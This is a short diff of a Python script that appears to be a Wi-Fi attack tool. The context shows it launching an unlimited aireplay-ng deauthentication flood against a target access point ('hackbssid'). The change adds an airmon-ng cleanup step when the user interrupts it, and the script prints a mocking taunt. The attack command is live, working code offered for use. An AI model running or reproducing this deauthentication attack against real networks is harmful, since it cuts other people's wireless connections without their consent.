@@ -165,4 +165,5 @@ try:
     print(R)
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
 except KeyboardInterrupt:
+    subprocess.run(["airmon-ng", "stop", hacknic])
     print(G + "\n\n[UwU]" + P + "You Get Wifucked" + G + "[UwU]" + W)
